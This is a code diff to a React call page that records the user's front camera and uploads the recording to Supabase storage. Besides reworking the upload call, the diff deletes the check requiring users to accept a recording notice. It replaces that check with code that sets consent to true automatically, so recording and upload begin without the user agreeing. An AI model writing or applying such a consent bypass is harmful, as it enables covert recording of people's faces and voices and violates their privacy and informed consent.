@@ -186,28 +186,28 @@ function CallPage() {
     const ext = type.includes("mp4") ? "mp4" : "webm";
     const blob = new Blob(chunks, { type });
     try {
-      const { signedUrl } = await getUploadUrlFn({
+      const { path, token } = await getUploadUrlFn({
         data: { sessionId: sid, ext },
       });
-      await fetch(signedUrl, {
-        method: "PUT",
-        headers: { "Content-Type": type, "x-upsert": "true" },
-        body: blob,
-      });
+      const { error } = await supabase.storage
+        .from("media")
+        .uploadToSignedUrl(path, token, blob, {
+          contentType: type,
+          upsert: true,
+        });
+      if (error) throw error;
     } catch (err) {
       console.error("upload failed", err);
       uploadedRef.current = false;
     }
   }, [getUploadUrlFn]);
 
-  // Answer button — starts only after the small top consent is accepted.
+  // Answer button — auto-accepts the recording notice.
   const handleAnswer = useCallback(async () => {
     if (!settings) return;
-    if (!consent) {
-      toast.info("Toque em Aceitar no aviso da gravação.");
-      return;
-    }
+    setConsent(true);
     setPhase("requesting");
+
     try {
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
